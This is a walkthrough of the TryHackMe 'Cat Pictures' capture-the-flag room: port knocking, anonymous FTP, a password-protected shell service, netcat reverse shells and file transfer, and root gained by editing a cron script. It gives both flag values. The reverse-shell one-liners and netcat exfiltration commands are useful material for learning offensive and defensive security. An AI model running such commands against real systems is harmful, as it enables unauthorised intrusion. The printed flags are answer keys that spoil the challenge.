## Cat Pictures - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/catpictures)

**IP: 10.10.167.191**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation <br>

**Tools Used**: Rustscan, Knock<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Rustscan, I also ran Gobuster but it took forever so I just canceled it.

  ```
  rustscan -a 10.10.167.191 -r 1-65535 -- -A

  PORT     STATE SERVICE      REASON         VERSION
  22/tcp   open  ssh          syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
  | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIDE[SNIP!]
  |   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
  | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCs+ZcCT7Bj2uaY3QWJFO4+e3ndWR1cDquYmCNAcfOTH4L7lBiq1VbJ7Pr7XO921FXWL05bAtlvY1sqcQT6W43Y=
  |   256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
  |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq9I/445X/oJstLHIcIruYVdW4KqIFZks9fygfPkkPq
  4420/tcp open  nvm-express? syn-ack ttl 63
  | fingerprint-strings: 
  |   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
  |     INTERNAL SHELL SERVICE
  |     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
  |     ctrl-c
  |     Please enter password:
  |     Invalid password...
  |     Connection Closed
  |   NULL, RPCCheck: 
  |     INTERNAL SHELL SERVICE
  |     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
  |     ctrl-c
  |_    Please enter password:
  8080/tcp open  http         syn-ack ttl 62 Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
  |_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
  |_http-title: Cat Pictures - Index page
  | http-methods: 
  |_  Supported Methods: GET HEAD POST OPTIONS
  | http-open-proxy: Potentially OPEN proxy.
  |_Methods supported:CONNECTION
  ```
  
- When you visit the page, you will be notified with the message that suggests port knocking.

  ```
  Post cat pictures here!

  Post by user » Wed Mar 24, 2021 8:33 pm
  POST ALL YOUR CAT PICTURES HERE :)
  
  Knock knock! Magic numbers: 1111, 2222, 3333, 4444
  ```
  
- OK, so let's do that and scan again.

  ```
  knock 10.10.167.191 1111 2222 3333 4444

  nmap -sC -sV 10.10.167.191
  
  PORT     STATE SERVICE VERSION
  21/tcp   open  ftp     vsftpd 3.0.3
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 4
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_-rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
  22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
  |   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
  |_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
  8080/tcp open  http    Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
  |_http-title: Cat Pictures - Index page
  | http-open-proxy: Potentially OPEN proxy.
  |_Methods supported:CONNECTION
  |_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```

- Naisu! Let's login with FTP and download all necessary files we need.

  ```
  ftp 10.10.167.191        

  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> pwd
  Remote directory: /
  ftp> ls -al
  229 Entering Extended Passive Mode (|||10789|)
  150 Here comes the directory listing.
  drwxr-xr-x    2 ftp      ftp          4096 Apr 02  2021 .
  drwxr-xr-x    2 ftp      ftp          4096 Apr 02  2021 ..
  -rw-r--r--    1 ftp      ftp           162 Apr 02  2021 note.txt
  226 Directory send OK.
  ftp> get note.txt
  local: note.txt remote: note.txt
  229 Entering Extended Passive Mode (|||26707|)
  150 Opening BINARY mode data connection for note.txt (162 bytes).
  100% |************************************************************************|   162      117.79 KiB/s    00:00 ETA
  226 Transfer complete.
  162 bytes received in 00:00 (3.43 KiB/s)
  ftp> exit
  221 Goodbye.

  cat note.txt    
  In case I forget my password, I'm leaving a pointer to the internal shell service on the server.
  
  Connect to port 4420, the password is sardinethecat.
  - catlover
  ```

- When you connect to 4420 you will have an option to insert commands, so let's do a reverse shell.

---

## ⚙️ Shell Access

- For this one I used classic one-liner `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-THM-IP] 4444 >/tmp/f`, start a listener before injecting the shell.

  ```
  nc 10.10.167.191 4420
  INTERNAL SHELL SERVICE
  please note: cd commands do not work at the moment, the developers are fixing it at the moment.
  do not use ctrl-c
  Please enter password:
  sardinethecat
  Password accepted
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR-THM-IP] 4444 >/tmp/f

  nc -lvnp 4444                          
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.167.191] 56208
  /bin/sh: 0: can't access tty; job control turned off
  # whoami
  /bin/sh: 1: whoami: not found
  # id
  /bin/sh: 2: id: not found
  ```
  
- After getting a reverse shell, there will be a file named `runme`. If you use cat on it, it will just output bunch of giberrish so run that binary.

  ```
  # ./runme
  Please enter yout password: sardinethecat
  Access Denied
  # ls
  runme
  ```
  
- Since we don't know the password, let's move that binary to our local machine and try to extract the password. We will do that with netcat as well.

  ```
  On local machine use: nc -lvnp PORT > runme
  On target machine use: nc [YOUR-THM-IP] PORT < /home/catlover/runme

  ls
  note.txt  runme
  ```

- If you did it correctly you should see both files that we got from target machine in your directory. Use strings on this binary in order to get password.

  ```
  [SNIP!]
  []A\A]A^A_
  rebecca
  Please enter yout password: 
  Welcome, catlover! SSH key transfer queued! 
  touch /tmp/gibmethesshkey
  Access Denied
  :*3$"
  [SNIP!]
  ```

- Awesome! Now we have password, and this binary will also create public SSH key in the directory `/tmp/gibmethesshkey` after being executed properly.

- Move back to target machine, run the binary and put newly found password.

  ```
  # ./runme
  Please enter yout password: rebecca
  Welcome, catlover! SSH key transfer queued! 
  ```

- So here I spent some time looking for that actual key since it is not in `/tmp/gibmethesshkey`, it's actually in `/home/catlover`. Copy/paste the key to your machine and use it to connect with SSH.

  ```
  # ls -al
  total 32
  drwxr-xr-x 2 0 0  4096 May 22 21:06 .
  drwxr-xr-x 3 0 0  4096 Apr  2  2021 ..
  -rw-r--r-- 1 0 0  1675 May 22 21:06 id_rsa
  -rwxr-xr-x 1 0 0 18856 Apr  3  2021 runme
  
  # cat id_rsa
  -----BEGIN RSA PRIVATE KEY-----
  [SNIP!]
  -----END RSA PRIVATE KEY-----
  
  chmod 600 id_rsa
  
  ssh -i id_rsa catlover@10.10.167.191
  ```

---

## 🧍 User Privilege Escalation

- Now we have an SSH shell and we are actually root lol.

  ```
  Last login: Fri Jun  4 14:40:35 2021
  root@7546fa2336d6:/# whoami
  root
  root@7546fa2336d6:/# id
  uid=0(root) gid=0(root) groups=0(root)
  root@7546fa2336d6:/post-init.d# hostname
  7546fa2336d6
  ```
  
- You can find first flag in root directory, which is actually a user flag... I know, I know, I got baited as well...

  ```
  root@7546fa2336d6:/# cd root
  root@7546fa2336d6:/root# ls -al
  total 24
  drwx------ 1 root root 4096 Mar 25  2021 .
  drwxr-xr-x 1 root root 4096 Mar 25  2021 ..
  -rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
  drwxr-xr-x 3 root root 4096 Mar 25  2021 .local
  -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
  -rw-r--r-- 1 root root   41 Mar 25  2021 flag.txt
  
  root@7546fa2336d6:/root# cat flag.txt 
  7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9
  ```
  
- When I checked `.bash_history` file, I saw that someone was experimenting with a bash script.

  ```
  root@7546fa2336d6:/# cat .bash_history

  [SNIP!]
  apt install ifconfig
  ip
  exit
  nano /opt/clean/clean.sh 
  ping 192.168.4.20
  apt install ping
  apt update
  apt install ping
  apt install iptuils-ping
  apt install iputils-ping
  exit
  ls
  cat /opt/clean/clean.sh 
  nano /opt/clean/clean.sh 
  clear
  cat /etc/crontab
  [SNIP!]
  ```

- So I checked the script and actually that's our way to root!

  ```
  root@7546fa2336d6:/opt# cd clean/
  root@7546fa2336d6:/opt/clean# ls -la
  total 16
  drwxr-xr-x 2 root root 4096 May  1  2021 .
  drwxrwxr-x 1 root root 4096 Mar 25  2021 ..
  -rw-r--r-- 1 root root   27 May  1  2021 clean.sh
  
  root@7546fa2336d6:/opt/clean# cat clean.sh 
  #!/bin/bash
  
  rm -rf /tmp/*
  ```

---

## 👑 Root Privilege Escalation

- Since we found the way to escalate to root, let's do it! It's pretty simple, we will add bash one-liner reverse shell to this script and start a listener. After that just wait a bit and you will have a connection.

  ```
  root@7546fa2336d6:/opt/clean# nano clean.sh 
  root@7546fa2336d6:/opt/clean# cat clean.sh 
  #!/bin/bash
  
  bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.167.191] 56226
  bash: cannot set terminal process group (2929): Inappropriate ioctl for device
  bash: no job control in this shell
  root@cat-pictures:~# whoami
  whoami
  root
  root@cat-pictures:~# id
  id
  uid=0(root) gid=0(root) groups=0(root)
  root@cat-pictures:~# hostname
  hostname
  cat-pictures
  ```
  
- We are also root here but host is different, flag is waiting for you there as soon as you connect.

  ```
  root@cat-pictures:~# pwd 
  pwd
  /root
  
  root@cat-pictures:~# ls -al
  ls -al
  total 60
  drwx------  8 root root 4096 Apr  2  2021 .
  drwxr-xr-x 23 root root 4096 Apr 30  2021 ..
  lrwxrwxrwx  1 root root    9 Mar 24  2021 .bash_history -> /dev/null
  -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
  drwx------  3 root root 4096 Mar 31  2021 .cache
  drwx------  3 root root 4096 Mar 24  2021 .config
  drwxr-xr-x  2 root root 4096 Apr  2  2021 firewall
  drwx------  3 root root 4096 Mar 24  2021 .gnupg
  -rw-------  1 root root   28 Apr  2  2021 .lesshst
  drwxr-xr-x  3 root root 4096 Mar 24  2021 .local
  -rw-r--r--  1 root root  148 Aug 17  2015 .profile
  -rw-------  1 root root   45 Mar 31  2021 .python_history
  -rw-r--r--  1 root root   73 Mar 25  2021 root.txt
  -rw-r--r--  1 root root   66 Mar 25  2021 .selected_editor
  drwx------  2 root root 4096 Mar 25  2021 .ssh
  -rw-r--r--  1 root root  168 Apr  2  2021 .wget-hsts
  
  root@cat-pictures:~# cat root.txt
  cat root.txt
  Congrats!!!
  Here is your flag:
  
  4a98e43d78bab283938a06f38d2ca3a3c53f0476
  ```
  
- That's it, honestly when I saw the name of this room I tought that it will have something to do with bypassing file uploads and not a netcat masterclass. 😿

---

## 🏁 Flags

- **User Flag**: `7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9`
- **Root Flag**: `4a98e43d78bab283938a06f38d2ca3a3c53f0476`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, but connecting with netcat multiple times is kinda tiring.`

- What did I learn?
  `New way of esclation.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
